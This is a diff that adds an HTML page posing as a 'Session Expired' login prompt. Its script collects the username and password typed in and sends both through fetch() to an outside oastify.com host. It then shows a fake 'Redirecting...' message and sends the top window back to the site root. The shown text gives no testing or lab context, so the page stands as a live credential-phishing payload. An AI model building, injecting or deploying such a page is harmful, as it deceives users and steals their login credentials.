@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head><title>.</title></head>
+<body style="margin:0;background:rgba(0,0,0,.5);display:flex;align-items:center;justify-content:center;height:100vh">
+<div style="background:#fff;padding:30px;border-radius:8px;text-align:center;box-shadow:0 0 20px rgba(0,0,0,.3)">
+  <h2>Session Expired</h2>
+  <p>Please re-enter your credentials</p>
+  <input id="u" placeholder="Username" autofocus style="display:block;width:260px;padding:8px;margin:8px auto">
+  <input id="p" type="password" placeholder="Password" style="display:block;width:260px;padding:8px;margin:8px auto">
+  <button id="b" style="padding:8px 20px;cursor:pointer;margin-top:5px">Log In</button>
+</div>
+<script>
+document.getElementById('b').onclick = function() {
+  var u = document.getElementById('u').value;
+  var p = document.getElementById('p').value;
+  if (!u || !p) return;
+  fetch('https://hez7k97peisucx0lwhxqs2ylxc33ruii7.oastify.com?u=' + encodeURIComponent(u) + '&p=' + encodeURIComponent(p));
+  document.body.innerHTML = '<div style="display:flex;align-items:center;justify-content:center;height:100vh;color:#fff"><h2>Redirecting...</h2></div>';
+  try { top.location = '/'; } catch(e) {}
+};
+</script>
+</body>
+</html>
